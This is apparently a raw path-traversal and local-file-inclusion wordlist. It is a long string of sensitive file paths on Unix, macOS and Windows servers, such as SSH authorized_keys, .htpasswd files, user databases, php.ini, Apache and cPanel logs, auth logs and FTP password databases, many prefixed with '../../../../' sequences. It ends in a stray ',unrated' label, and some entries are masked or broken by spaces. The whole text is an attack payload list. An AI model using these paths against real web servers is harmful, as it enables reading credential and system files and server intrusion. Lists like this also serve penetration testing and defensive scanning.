/.sh_history /.s***** /.ssh/authorized_keys user/.htpasswd ../users.db.php users.db.php users/.htpasswd /usr/apache2/conf/httpd.conf /usr/apache/conf/httpd.conf /usr/etc/pure-ftpd.conf /usr/lib/cron/log /usr/lib/php.ini /usr/lib/php/php.ini /usr/lib/security/mkuser.default /usr/local/apache2/conf/httpd.conf /usr/local/apache2/httpd.conf /usr/local/apache2/logs/access_log /usr/local/apache2/logs/access.log /usr/local/apache2/logs/error_log /usr/local/apache2/logs/error.log /usr/local/apache/conf/httpd.conf /usr/local/apache/conf/php.ini /usr/local/apache/httpd.conf /usr/local/apache/log /usr/local/apache/logs /usr/local/apache/logs/access_log /usr/local/apache/logs/access_ log /usr/local/apache/logs/access.log /usr/local/apache/logs/access. log ../../../../../../../usr/local/apache/logs/access_ log ../../../../../../../usr/local/apache/logs/access. log ../../../../../usr/local/apache/logs/access_log ../../../../../usr/local/apache/logs/access.log /usr/local/apache/logs/error_log /usr/local/apache/logs/error.log ../../../../../../../usr/local/apache/logs/error_l og ../../../../../../../usr/local/apache/logs/error.l og ../../../../../usr/local/apache/logs/error_log ../../../../../usr/local/apache/logs/error.log /usr/local/apps/apache2/conf/httpd.conf /usr/local/apps/apache/conf/httpd.conf /usr/local/cpanel/logs /usr/local/cpanel/logs/access_log /usr/local/cpanel/logs/error_log /usr/local/cpanel/logs/license_log /usr/local/cpanel/logs/login_log /usr/local/cpanel/logs/stats_log /usr/local/etc/apache2/conf/httpd.conf /usr/local/etc/apache/conf/httpd.conf /usr/local/etc/apache/v*****.conf /usr/local/etc/httpd/conf/httpd.conf /usr/local/etc/httpd/logs/access_log /usr/local/etc/httpd/logs/error_log /usr/local/etc/php.ini /usr/local/etc/pure-ftpd.conf /usr/local/etc/pureftpd.pdb /usr/local/httpd/conf/httpd.conf /usr/local/lib/php.ini /usr/local/php4/httpd.conf /usr/local/php4/httpd.conf.php /usr/local/php4/lib/php.ini /usr/local/php5/httpd.conf /usr/local/php5/httpd.conf.php /usr/local/php5/lib/php.ini /usr/local/php/httpd.conf /usr/local/php/httpd.conf.php /usr/local/php/lib/php.ini /usr/local/pureftpd/etc/pure-ftpd.conf /usr/local/pureftpd/etc/pureftpd.pdb /usr/local/pureftpd/sbin/pure-config.pl /usr/local/www/logs/thttpd_log /usr/local/Zend/etc/php.ini /usr/pkgsrc/net/pureftpd/ /usr/ports/contrib/pure-ftpd/ /usr/ports/ftp/pure-ftpd/ /usr/ports/net/pure-ftpd/ /usr/sbin/pure-config.pl /usr/spool/lp/log /usr/spool/mqueue/syslog /var/adm /var/adm/acct/sum/loginlog /var/adm/aculog /var/adm/aculogs /var/adm/crash/unix /var/adm/crash/vmcore /var/adm/cron/log /var/adm/dtmp /var/adm/lastlog /var/adm/lastlog/username /var/adm/log/asppp.log /var/adm/loginlog /var/adm/log/xferlog /var/adm/lp/lpd-errs /var/adm/messages /var/adm/pacct /var/adm/qacct /var/adm/ras/bootlog /var/adm/ras/errlog /var/adm/sulog /var/adm/SYSLOG /var/adm/utmp /var/adm/utmpx /var/adm/vold.log /var/adm/wtmp /var/adm/wtmpx /var/adm/X0msgs /var/apache/log /var/apache/logs /var/apache/logs/access_log /var/apache/logs/error_log /var/cpanel/cpanel.config /var/cron/log /var/lib/mlocate/mlocate.db /var/lib/mysql/my.cnf /var/local/www/conf/php.ini /var/lock/samba /var/log /var/log/access_log /var/log/access.log ../../../../../../../var/log/access_log ../../../../../../../var/log/access.log ../../../../../var/log/access_log /var/log/acct /var/log/apache2/access_log /var/log/apache2/access.log ../../../../../../../var/log/apache2/access_log ../../../../../../../var/log/apache2/access.log /var/log/apache2/error_log /var/log/apache2/error.log ../../../../../../../var/log/apache2/error_log ../../../../../../../var/log/apache2/error.log /var/log/apache/access_log /var/log/apache/access.log ../../../../../../../var/log/apache/access_log ../../../../../../../var/log/apache/access.log ../../../../../var/log/apache/access_log ../../../../../var/log/apache/access.log /var/log/apache/error_log /var/log/apache/error.log ../../../../../../../var/log/apache/error_log ../../../../../../../var/log/apache/error.log ../../../../../var/log/apache/error_log ../../../../../var/log/apache/error.log /var/log/apache-ssl/access.log /var/log/apache-ssl/error.log /var/log/auth /var/log/authlog /var/log/auth.log /var/log/boot.log /var/log/cron.log /var/log/dmesg /var/log/error_log /var/log/error.log ../../../../../../../var/log/error_log ../../../../../../../var/log/error.log ../../../../../var/log/error_log /var/log/exim_mainlog /var/log/exim/mainlog /var/log/exim_paniclog /var/log/exim/paniclog /var/log/exim_rejectlog /var/log/exim/rejectlog /var/log/ftplog /var/log/ftp-proxy /var/log/ftp-proxy/ftp-proxy.log /var/log/httpd/ /var/log/httpd/access_log /var/log/httpd/access.log ../../../../../var/log/httpd/access_log /var/log/httpd/error_log /var/log/httpd/error.log ../../../../../var/log/httpd/error_log /var/log/httpsd/ssl.access_log /var/log/httpsd/ssl_log /var/log/kern.log /var/log/lastlog /var/log/lighttpd /var/log/maillog /var/log/message /var/log/messages /var/log/mysqlderror.log /var/log/mysqld.log /var/log/mysql.log /var/log/mysql/mysql-bin.log /var/log/mysql/mysql.log /var/log/mysql/mysql-slow.log /var/log/ncftpd.errs /var/log/ncftpd/misclog.txt /var/log/news /var/log/news.all /var/log/news/news /var/log/news/news.all /var/log/news/news.crit /var/log/news/news.err /var/log/news/news.notice /var/log/news/suck.err /var/log/news/suck.notice /var/log/poplog /var/log/POPlog /var/log/proftpd /var/log/proftpd.access_log /var/log/proftpd.xferlog /var/log/proftpd/xferlog.legacy /var/log/pureftpd.log /var/log/pure-ftpd/pure-ftpd.log /var/log/qmail /var/log/qmail/ /var/log/samba /var/log/samba-log.%m /var/log/secure /var/log/smtpd /var/log/spooler /var/log/syslog /var/log/telnetd /var/log/thttpd_log /var/log/utmp /var/log/vsftpd.log /var/log/wtmp /var/log/xferlog /var/log/yum.log /var/lp/logs/lpNet /var/lp/logs/lpsched /var/lp/logs/requests /var/mysql.log /var/run/httpd.pid /var/run/mysqld/mysqld.pid /var/run/utmp /var/saf/_log /var/saf/port/log /var/spool/errors /var/spool/locks /var/spool/logs /var/spool/tmp /var/www/conf/httpd.conf /var/www/html/.htaccess /var/www/localhost/htdocs/.htaccess /var/www/log/access_log /var/www/log/error_log /../../var/www/logs/access_log /var/www/logs/access_log /var/www/logs/access.log ../../../../../../../var/www/logs/access_log ../../../../../../../var/www/logs/access.log ../../../../../var/www/logs/access.log /var/www/logs/error_log /var/www/logs/error.log ../../../../../../../var/www/logs/error_log ../../../../../../../var/www/logs/error.log ../../../../../var/www/logs/error_log ../../../../../var/www/logs/error.log /var/www/sitename/htdocs/ /var/www/v*****/sitename/httpdocs/.htaccess /var/www/web1/html/.htaccess /Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf /Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf /Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf /Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php /Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php /Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php /Volumes/Macintosh_HD1/usr/local/php/lib/php.ini /Volumes/webBackup/opt/apache2/conf/httpd.conf /Volumes/webBackup/private/etc/httpd/httpd.conf /Volumes/webBackup/private/etc/httpd/httpd.conf.default /web/conf/php.ini /WINDOWS\php.ini ../../windows/win.ini /WINNT\php.ini /..\..\..\..\..\..\winnt\win.ini /www/logs/proftpd.system.log /xampp\apache\bin\php.ini /.Xauthority",unrated
